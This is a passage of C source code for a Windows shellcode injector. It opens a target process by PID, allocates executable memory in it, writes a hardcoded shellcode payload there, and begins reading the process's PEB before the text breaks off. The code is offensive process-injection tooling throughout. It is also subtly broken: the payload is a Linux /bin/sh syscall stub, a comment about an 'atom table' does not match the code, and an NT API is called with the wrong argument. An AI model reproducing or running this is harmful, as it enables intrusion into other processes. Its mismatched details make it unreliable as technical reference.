#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "kernel32.lib")

const char* shellcode = 
"\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e"
"\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05";

BOOL InjectShellCode(DWORD pid, const char* moduleName, const char* functionSymbol)
{
    // Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("Failed to open process with PID %d (error: %d)\n", pid, GetLastError());
        return FALSE;
    }

    // Get the base address of the module
    HMODULE hModule = NULL;
    if (!GetModuleHandleExA(0, moduleName, &hModule)) {
        printf("Failed to get the base address of %s in the current process (error: %d)\n", moduleName, GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    // Get the address of the function
    FARPROC pFunction = GetProcAddress(hModule, functionSymbol);
    if (pFunction == NULL) {
        printf("Failed to get the address of %s in the current process (error: %d)\n", functionSymbol, GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    // Allocate memory for the shellcode in the target process
    LPVOID pRemoteShellcode = VirtualAllocEx(hProcess, NULL, strlen(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemoteShellcode == NULL) {
        printf("Failed to allocate memory for the shellcode in the target process (error: %d)\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    // Write the shellcode into the allocated memory
    if (!WriteProcessMemory(hProcess, pRemoteShellcode, shellcode, strlen(shellcode), NULL)) {
        printf("Failed to write the shellcode into the target process (error: %d)\n", GetLastError());
        CloseHandle(hProcess);
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
        return FALSE;
    }

    // Modify the atom table of the ntdll.dll module in the target process
    LPVOID pPebAddress = (LPVOID)0xFFFFFFFF;
    if (!NT_SUCCESS(NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pPebAddress, sizeof(pPebAddress), NULL))) {
        printf("Failed to get the PEB address of the target process (error: %d)\n", GetLastError());
        CloseHandle(hProcess);
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
        return FALSE;
    }

    PEB peb = { 0 };
    if (!ReadProcessMemory(hProcess, pPebAddress, &peb, sizeof(peb), NULL)) {
        printf("Failed to read the PEB of the target process (error: %d)\n", GetLastError());
       
